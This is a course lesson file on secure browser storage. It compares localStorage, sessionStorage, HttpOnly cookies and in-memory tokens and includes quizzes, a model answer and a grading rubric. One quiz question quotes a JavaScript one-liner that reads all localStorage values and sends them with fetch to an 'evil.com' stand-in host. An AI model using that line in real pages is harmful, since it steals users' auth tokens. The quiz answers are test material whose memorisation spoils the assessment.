---
id: fe-sen-m4-04
school: engineering
domainId: frontend-engineering
tier: SENIOR
moduleId: fe-sen-m4
moduleTitle: "Module 4: Security"
moduleGlyph: "🛡️"
moduleSortOrder: 4
topicSlug: secure_storage
topicTitle: "Secure Storage"
topicSortOrder: 4
lesson: secure_storage
title: "Secure Storage"
sortOrder: 1
difficulty: 4
estimatedMinutes: 30
xpReward: 120
practiceType: NONE
questType: SYNTHESIS
retrievalWeight: high
questTypes: [guided, solo, retrieval]
prerequisites: []
integrationDomains: [philosophy, psychology]
soloAssessment:
  type: PATTERN_MATCH
  rubricItems:
    - Correctly describes the security properties of localStorage, sessionStorage, cookies, and memory
    - Explains why localStorage is dangerous for sensitive data
    - Explains the security attributes of HttpOnly, Secure, and SameSite cookies
    - Gives a clear recommendation for token storage in SPAs
    - Synthesises the security/UX trade-offs between storage options
  keywords: [localStorage, sessionStorage, cookie, memory, HttpOnly, Secure, SameSite, XSS, accessible, persist, session]
  modelAnswer: |
    localStorage: persistent across sessions, accessible to all JavaScript on the domain (including XSS injections), synchronous API. sessionStorage: same as localStorage but cleared on tab close. Both are vulnerable to XSS — any injected script can read all values.

    Cookies with HttpOnly flag: not accessible to JavaScript at all — the browser sends them with requests but JS cannot read them. With Secure flag: only sent over HTTPS. With SameSite=Strict/Lax: not sent cross-origin (CSRF protection). HttpOnly cookies are the most secure storage for refresh tokens.

    Memory (React state, module variables): not persistent (cleared on page refresh), not accessible to other JavaScript contexts, not accessible after XSS injection to the DOM directly. Best for access tokens (short-lived, don't need persistence).

    Recommendation: Access tokens in memory (short-lived, reload clears). Refresh tokens in HttpOnly, Secure, SameSite=Strict cookies (set by the server). Never put passwords, credit cards, or secrets in localStorage.

    The trade-off: HttpOnly cookies require server cooperation (the auth server must set them), and introduce CSRF considerations (mitigated by SameSite). Memory requires silent refresh on page reload. These are acceptable costs for significantly better security.
guidedSteps:
  - type: MULTIPLE_CHOICE
    prompt: "A third-party analytics script is injected into your page via a supply chain attack. The script runs `Object.keys(localStorage).forEach(k => fetch('https://evil.com/'+localStorage[k]))`. What can it access?"
    options:
      - "Nothing — localStorage is sandboxed per script origin"
      - "All values in localStorage for the domain, including auth tokens"
      - "Only values set by the analytics script itself"
      - "Values, but only if the user has explicitly shared them"
    correctIndex: 1
    feedback: "localStorage is accessible to any JavaScript executing on the page — regardless of the script's origin. A malicious third-party script has identical access to localStorage as your own code. If auth tokens are in localStorage, they're stolen. This is why the auth community consensus is: don't store tokens in localStorage."
  - type: SHORT_TEXT
    prompt: "Explain why an HttpOnly cookie containing a refresh token cannot be read by a malicious XSS script injected into your page."
    hint: "Who can read HttpOnly cookies? Who cannot?"
  - type: FILL_BLANK
    prompt: "The ___ flag prevents JavaScript from reading a cookie. The ___ flag ensures the cookie is only sent over HTTPS."
    answer: "HttpOnly; Secure"
    hint: "Two cookie security attributes."
microCheckpoint:
  - type: MULTIPLE_CHOICE
    question: "You need to store a user's preferred theme ('dark' or 'light'). Which storage mechanism is appropriate?"
    options:
      - "HttpOnly cookie — it's the most secure"
      - "localStorage — this is not sensitive data; persistence is beneficial"
      - "Memory only — themes should reset on reload"
      - "sessionStorage — themes should clear on tab close"
    correctIndex: 1
    feedback: "Not everything needs the most secure storage. Theme preference is not sensitive. localStorage is perfect: it persists across sessions, is easy to read/write, and losing it to XSS causes no harm — the attacker learns the user's preferred theme. Apply security measures proportionate to sensitivity. Over-securing non-sensitive data adds complexity without benefit."
  - type: MULTIPLE_CHOICE
    question: "A user closes their tab and opens a new one. Which storage is preserved?"
    options:
      - "sessionStorage only"
      - "localStorage only"
      - "Both localStorage and sessionStorage"
      - "Neither — all browser storage clears on tab close"
    correctIndex: 1
    feedback: "sessionStorage is scoped to the browser tab — it's cleared when the tab closes. localStorage persists across tabs and browser restarts (until explicitly cleared or expired). Memory (React state) is cleared on any page navigation or reload. This persistence model should guide which storage you use for different data types."
retrieval:
  recall: "Compare localStorage, sessionStorage, cookies (HttpOnly), and memory for: persistence, JavaScript accessibility, and best use case."
  explain: "Why should refresh tokens be stored in HttpOnly cookies rather than localStorage?"
  mistakeId:
    code: |
      // On successful login
      localStorage.setItem('user', JSON.stringify({
        id: user.id,
        email: user.email,
        role: user.role,
        accessToken: response.accessToken,
        refreshToken: response.refreshToken,
      }));
    answer: "Three problems: (1) The access token in localStorage is accessible to XSS. (2) The refresh token in localStorage is even worse — long-lived and allows indefinite token generation if stolen. (3) User data (email, role) in localStorage is also readable by XSS — though less immediately dangerous. Fix: access token in memory (React state), refresh token in HttpOnly cookie (server-set), user profile data can stay in localStorage or React state (not sensitive)."
---

# Hook

You store auth tokens in localStorage for convenience. A third-party chart library in your dependencies is compromised in a supply chain attack. The malicious code reads localStorage and sends all tokens to the attacker's server.

Every logged-in user's account is now compromised. The attack requires no XSS in your own code — only in your dependencies.

This is why storage choices are security decisions.

# Lore Introduction

*"Not all vaults are equal,"* the Vault Master explains. *"The open shelf: accessible to everyone who enters the room. The locked cabinet: accessible to those with a key. The sealed vault: accessible only through the correct ritual, inaccessible to intruders even in the room."*

She points to the browser's storage mechanisms. *"localStorage is the open shelf. An HttpOnly cookie is the sealed vault. Choose the correct storage for the sensitivity of what you store."*

# Core Learning

## Concept Introduction

**Browser storage comparison:**

| | localStorage | sessionStorage | Cookie (HttpOnly) | Memory |
|---|---|---|---|---|
| **Persists** | Across sessions | Tab lifetime | Configurable | Page lifetime |
| **JS accessible** | ✅ Yes | ✅ Yes | ❌ HttpOnly | ✅ Yes (same context) |
| **XSS risk** | High | High | None (HttpOnly) | Low |
| **CSRF risk** | None | None | Yes (mitigate w/ SameSite) | None |
| **Best for** | Non-sensitive preferences | Temporary session data | Refresh tokens | Access tokens |

**Cookie security attributes:**
```http
Set-Cookie: refreshToken=abc123; 
  HttpOnly;      /* JS cannot read this */
  Secure;        /* HTTPS only */
  SameSite=Strict; /* No cross-origin sends */
  Path=/auth;    /* Only sent to /auth endpoints */
  Max-Age=604800; /* 7 days */
```

**The recommended pattern for SPAs:**
```typescript
// Access token — short-lived, in memory
// (module-level variable — persists across renders, not page reloads)
let accessToken: string | null = null;

export function setAccessToken(token: string) { accessToken = token; }
export function getAccessToken() { return accessToken; }

// On page load: silent refresh (uses HttpOnly refresh token cookie)
// Auth server reads the HttpOnly cookie server-side, returns a new access token
await refreshAccessToken(); // API call — server reads cookie, returns new token
```

## Common Mistakes

- **localStorage for auth tokens.** Accessible to any JS, including injected scripts.
- **Not using HttpOnly on refresh tokens.** If the refresh token is in a readable cookie, it's as vulnerable as localStorage.
- **Not using Secure on cookies.** Without Secure, cookies are sent over HTTP — sniffable on open networks.
- **Forgetting the silent refresh after page reload.** Memory tokens are gone on reload — implement the refresh flow on app init.

## Mental Model

Storage security is a spectrum from public shelf to sealed vault. The sensitivity of the data should match the security level of the storage. Auth tokens are the keys to everything — they belong in the most secure available storage (HttpOnly cookies for refresh tokens, memory for access tokens). Theme preferences are not sensitive — localStorage is fine. The mistake is applying one-size-fits-all storage.

## Mini Summary

- ✔ localStorage/sessionStorage are accessible to all JS — never store auth tokens here
- ✔ HttpOnly cookies: inaccessible to JS, best for refresh tokens (set by server)
- ✔ Memory (React state/module vars): not persistent, best for access tokens
- ✔ Cookie security attributes: HttpOnly + Secure + SameSite=Strict
- ✔ Security level should match data sensitivity — not everything needs the vault

# Guided Practice Quest

Work through the guided steps to understand XSS access to localStorage and the properties of HttpOnly cookies.

# Solo Practice Quest

Design the storage strategy for a financial services SPA. It needs to store: (1) access token, (2) refresh token, (3) user's name/email for display, (4) UI preferences (theme, language), (5) a recently viewed accounts list. For each, choose the storage mechanism and justify the choice based on sensitivity and persistence requirements.

# Integration

**Philosophy — Threat Modelling as Applied Epistemology**

Secure storage decisions require threat modelling: identifying what attackers want (credentials, tokens), what methods they use (XSS, supply chain, network interception), and which defences match which threats. This is applied epistemology — reasoning about what is and isn't knowable by different actors. An HttpOnly cookie is 'not knowable' by JavaScript; memory is 'not knowable' after page reload; localStorage is 'knowable' by any script. The philosophical exercise is mapping information asymmetry: what should the attacker not know? Store the corresponding secret in a location the attacker cannot access. This requires thinking from the attacker's perspective — a form of second-order reasoning about knowledge and access.

# Lore Conclusion

*"The vault assignments are correct,"* the Vault Master says. *"Tokens in the sealed vault. Preferences on the accessible shelf. The most sensitive items beyond the reach of intruders. Security and accessibility, proportionate to what is stored."*

---
